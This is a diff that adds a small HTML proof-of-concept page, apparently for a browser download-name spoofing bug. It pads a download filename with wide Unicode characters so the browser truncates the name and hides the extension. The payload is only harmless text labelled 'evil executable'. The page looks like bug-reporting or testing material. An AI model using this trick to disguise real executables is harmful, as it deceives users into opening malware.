@@ -1,0 +1,46 @@
+
+
+
+<html lang="en"><head>
+       
+
+    
+  </head>
+
+<body>   
+
+	<h1>File name ext  truncated Spoof</h1>
+  
+   <div><button onclick="normal()">Normal</button></div><br/>
+    <div><button onclick="triggerDownload()">Spoof file</button></div>
+
+</body>
+
+
+
+<script>
+
+ 
+	
+ 
+  function triggerDownload() {
+
+    var a = document.createElement('a');
+
+     a.download = "꧁File꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁.txt";
+    a.href="data:text/plain,This is an evil executable"
+	a.click();
+  }
+  
+  
+  function normal() {
+
+    var a = document.createElement('a');
+
+     a.download = "harmlessssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss.txt";
+    a.href="data:text/plain,This is an evil executable"
+	a.click();
+  }
+</script>
+
+</html>
